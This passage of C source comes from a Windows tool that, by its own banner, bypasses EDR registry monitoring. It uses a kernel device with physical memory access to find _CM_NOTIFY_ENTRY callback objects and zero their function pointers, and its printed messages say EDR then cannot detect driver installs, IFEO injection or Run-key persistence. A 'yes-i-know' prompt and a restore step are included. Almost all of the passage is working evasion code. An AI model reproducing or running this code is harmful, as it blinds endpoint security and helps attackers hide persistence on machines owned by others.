    LookupPrivilegeValueA(NULL,"SeDebugPrivilege",&tp.Privileges[0].Luid);
    tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
    BOOL ok=AdjustTokenPrivileges(hTok,FALSE,&tp,0,NULL,NULL);
    printf("[*] SeDebugPrivilege: %s\n",(ok&&GetLastError()==0)?"enabled":"FAILED");
    CloseHandle(hTok);
}

static int parse_selection(const char *s, int ng)
{
    char buf[256]; strncpy(buf,s,255); buf[255]='\0';
    for(int i=(int)strlen(buf)-1;i>=0&&(buf[i]=='\n'||buf[i]=='\r'||buf[i]==' ');i--) buf[i]='\0';
    if(_stricmp(buf,"all")==0){
        for(int i=0;i<ng;i++) g_groups[i].selected=1;
        return ng;
    }
    if(_stricmp(buf,"edr")==0){
        int cnt=0;
        for(int i=0;i<ng;i++)
            if(g_groups[i].cls==DRV_OTHER){g_groups[i].selected=1;cnt++;}
        return cnt;
    }
    if(_stricmp(buf,"none")==0||buf[0]=='\0') return 0;
    int cnt=0; char *tok=strtok(buf,",");
    while(tok){
        int n=atoi(tok);
        if(n>=1&&n<=ng&&!g_groups[n-1].selected){g_groups[n-1].selected=1;cnt++;}
        tok=strtok(NULL,",");
    }
    return cnt;
}

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
int main(void)
{
    SetConsoleOutputCP(CP_UTF8);
    printf("=== CmRegisterCallback Bypass â€” Registry Monitoring ===\n\n");
    printf("  Targets: _CM_NOTIFY_ENTRY.Function (pool object)\n");
    printf("  Effect:  EDR registry callbacks silenced â€” no detection of\n");
    printf("           driver install, IFEO injection, persistence keys.\n\n");

    g_dev=CreateFileW(DEVICE_NAME,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
    if(g_dev==INVALID_HANDLE_VALUE){printf("[-] Cannot open device: %lu\n",GetLastError());return 1;}
    printf("[+] Device opened\n");
    enable_debug_privilege();
    printf("\n");

    load_ranges();
    printf("[1] Physical ranges: %d\n",g_nranges);
    if(!g_nranges){printf("[-] No ranges\n");CloseHandle(g_dev);return 1;}
    for(int i=0;i<g_nranges;i++)
        printf("    [%d] 0x%016llX  %llu MB\n",i,
               (unsigned long long)g_ranges[i].base,
               (unsigned long long)(g_ranges[i].size>>20));
    printf("\n");

    load_module_map();
    printf("[2] Kernel modules: %d\n\n",g_nmods);

    /* ntoskrnl VA + path */
    MOD_LIST *ml=get_module_list();
    if(!ml){printf("[-] Module list failed\n");CloseHandle(g_dev);return 1;}
    uint64_t nt_va=(uint64_t)ml->Modules[0].ImageBase;
    uint32_t nt_size=ml->Modules[0].ImageSize;
    char nt_path[512]={0};
    {
        const char *fn=ml->Modules[0].FullPathName+ml->Modules[0].OffsetToFileName;
        char sd[MAX_PATH]; GetSystemDirectoryA(sd,sizeof sd);
        snprintf(nt_path,sizeof nt_path,"%s\\%s",sd,fn);
        if(GetFileAttributesA(nt_path)==INVALID_FILE_ATTRIBUTES)
            snprintf(nt_path,sizeof nt_path,"%s\\ntoskrnl.exe",sd);
    }
    free(ml);
    printf("[3] ntoskrnl VA=0x%016llX  size=0x%X\n    Path=%s\n\n",
           (unsigned long long)nt_va,nt_size,nt_path);

    HANDLE hf=CreateFileA(nt_path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(hf==INVALID_HANDLE_VALUE){printf("[-] Cannot open ntoskrnl\n");CloseHandle(g_dev);return 1;}
    DWORD pe_sz=GetFileSize(hf,NULL);
    uint8_t *pe_buf=(uint8_t*)malloc(pe_sz);
    DWORD rd=0; ReadFile(hf,pe_buf,pe_sz,&rd,NULL); CloseHandle(hf);

    printf("[4] Finding ntoskrnl PA...\n");
    uint64_t nt_pa=find_ntoskrnl_pa(nt_path);
    if(!nt_pa){printf("[-] ntoskrnl PA not found\n");free(pe_buf);CloseHandle(g_dev);return 1;}
    printf("    PA=0x%016llX\n\n",(unsigned long long)nt_pa);

    /* Secondary: report list head location via LEA scan */
    printf("[5] Secondary â€” LEA scan for CmRegisterCallback list head:\n");
    report_list_head(pe_buf, pe_sz, nt_pa, nt_va, "CmUnRegisterCallback");
    report_list_head(pe_buf, pe_sz, nt_pa, nt_va, "CmRegisterCallbackEx");
    printf("\n");
    free(pe_buf);

    SetConsoleCtrlHandler(ctrl_handler, TRUE);

    /* Primary: physical pool scan */
    printf("[6] Primary â€” physical scan for _CM_NOTIFY_ENTRY pool objects (8 guards)...\n\n");
    scan_physical();
    printf("\n    Entries found: %d\n\n", g_n_cm);

    if (!g_n_cm) {
        printf("[-] No CM callback entries found.\n");
        printf("    Possible: no EDR uses CmRegisterCallback, or layout differs.\n");
        printf("    Check LEA scan output above for list head address.\n");
        CloseHandle(g_dev); return 0;
    }

    build_groups();

    printf("[7] Groups by driver:\n\n");
    printf("    %-4s %-28s %-7s %s\n","#","Driver","Entries","Class");
    printf("    %.*s\n",70,"----------------------------------------------------------------------");
    for(int g=0;g<g_n_groups;g++){
        CmGroup *grp=&g_groups[g];
        printf("    [%2d] %-28s %-7d %s\n",g+1,grp->driver,grp->n,drv_class_label(grp->cls));
        uint64_t shown[16]; int ns=0;
        for(int k=0;k<grp->n;k++){
            CmEntry *e=&g_cm[grp->indices[k]];
            int dup=0;
            for(int j=0;j<ns;j++) if(shown[j]==e->func_va){dup=1;break;}
            if(dup||ns>=16) continue;
            shown[ns++]=e->func_va;
            uint64_t drv_base=0;
            for(int m=1;m<g_nmods;m++)
                if(_stricmp(g_mods[m].name,grp->driver)==0){drv_base=g_mods[m].base;break;}
            printf("         â†’ %s+0x%llX  cookie=0x%016llX\n",
                   grp->driver,
                   (unsigned long long)(drv_base?e->func_va-drv_base:e->func_va),
                   (unsigned long long)e->cookie);
        }
        printf("\n");
    }

    printf("=============================================================\n");
    printf("  Commands: all / edr / none / 1,3\n");
    printf("  WARNING: [SYS] includes OS-critical registry monitors.\n");
    printf("=============================================================\n\n");

    int n_sel=0;
    while(1){
        printf("  > "); fflush(stdout);
        char line[256]={0}; fgets(line,sizeof line,stdin);
        line[strcspn(line,"\r\n")]='\0';
        for(int i=0;i<g_n_groups;i++) g_groups[i].selected=0;
        n_sel=parse_selection(line,g_n_groups);
        if(!n_sel){printf("  No groups selected â€” exiting.\n");goto done;}

        int has_unsafe=0;
        for(int i=0;i<g_n_groups;i++)
            if(g_groups[i].selected&&g_groups[i].cls!=DRV_OTHER) has_unsafe=1;
        if(has_unsafe){
            printf("\n  [!] WARNING: selection includes [SYS]/[NET]/[VM].\n");
            printf("      Type 'yes-i-know' to proceed: ");
            fflush(stdout);
            char c[32]={0}; fgets(c,sizeof c,stdin);
            c[strcspn(c,"\r\n")]='\0';
            if(strcmp(c,"yes-i-know")!=0){
                printf("  Cleared.\n\n"); continue;
            }
        }
        break;
    }

    printf("\n  Selected: ");
    for(int i=0;i<g_n_groups;i++) if(g_groups[i].selected) printf("[%d]%s ",i+1,g_groups[i].driver);
    printf("\n  Proceed? [y/N]: "); fflush(stdout);
    char yn[8]={0}; fgets(yn,sizeof yn,stdin);
    if(yn[0]!='y'&&yn[0]!='Y'){printf("  Aborted.\n");goto done;}
    printf("\n");

    printf("[8] Zeroing Function pointers...\n\n");
    for(int i=0;i<g_n_groups;i++){
        if(!g_groups[i].selected) continue;
        printf("  Group [%d] %s:\n",i+1,g_groups[i].driver);
        disable_group(&g_groups[i]);
        printf("\n");
    }

    printf("[9] Cache eviction (multi-CCD)... ");fflush(stdout);
    cache_evict_multiccd();
    printf("done\n\n");

    printf("=============================================================\n");
    printf("  CmRegisterCallback: DISABLED for selected drivers\n\n");
    printf("  Effect: EDR cannot detect driver/service install via registry,\n");
    printf("          IFEO persistence, Run-key changes, or config tampering.\n\n");
    printf("  Press Enter to RESTORE.  Ctrl+C also restores.\n");
    printf("=============================================================\n");
    fflush(stdout); getchar();

    do_restore_all();
    cache_evict_multiccd();

    printf("[10] Verifying:\n");
    int v_ok=0,v_total=0;
    for(int i=0;i<g_n_groups;i++){
        if(!g_groups[i].selected) continue;
        for(int k=0;k<g_groups[i].n;k++){
            CmEntry *e=&g_cm[g_groups[i].indices[k]];
            v_total++;
            uint64_t cur=0;
            if(phys_read(e->func_pa,&cur,8)&&memcmp(&cur,e->orig_func,8)==0) v_ok++;
        }
    }
    printf("    %d/%d entries restored\n\n",v_ok,v_total);
    if(v_ok<v_total) printf("[!] Some not verified â€” reboot recommended\n\n");
    printf("[+] Done.\n");

done:
    CloseHandle(g_dev);
    return 0;
}
